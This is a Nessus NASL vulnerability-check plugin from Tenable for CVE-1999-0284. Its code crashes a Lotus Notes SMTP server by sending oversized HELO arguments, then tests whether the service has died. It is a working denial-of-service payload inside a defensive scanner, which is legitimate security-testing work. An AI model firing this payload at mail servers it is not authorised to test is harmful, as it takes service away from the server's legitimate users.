#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10162);
 script_version ("$Revision: 1.33 $");
 script_cve_id("CVE-1999-0284");
 script_osvdb_id(126);

 script_name(english:"Lotus Notes SMTP Server HELO Command Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to perform a denial of service against the remote SMTP
server by sending it two HELO commands followed by a too long
argument.  This allows an unauthenticated, remote attacker to deny
service to legitimate users of the server." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Jan/190" );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a fix." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/01/15");
 script_cvs_date("$Date: 2016/10/27 15:14:57 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Crashes the remote SMTP server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");
include("misc_func.inc");

port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(1);

  s = smtp_recv_banner(socket:soc);
  if("220 " >!< s){
  	close(soc);
	exit(0);
	}
  c = string("HELO ", crap(510), "\r\n");
  z = crap(length:510, data:"Y");
  d = string("HELO ", z, "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if ( ! s ) exit(0);
  send(socket:soc, data:d);
  close(soc);
  
  flaw = 0;

if (service_is_dead(port: port) > 0)
  security_warning(port);

if (report_paranoia < 2) exit(0);

  soc2 = open_sock_tcp(port);
  if(!soc2)flaw = 1;
  else {
  	a = recv_line(socket:soc2, length:1024);
	if(!a)flaw = 1;
 	close(soc2);
       }
  
  if(flaw)security_warning(port);
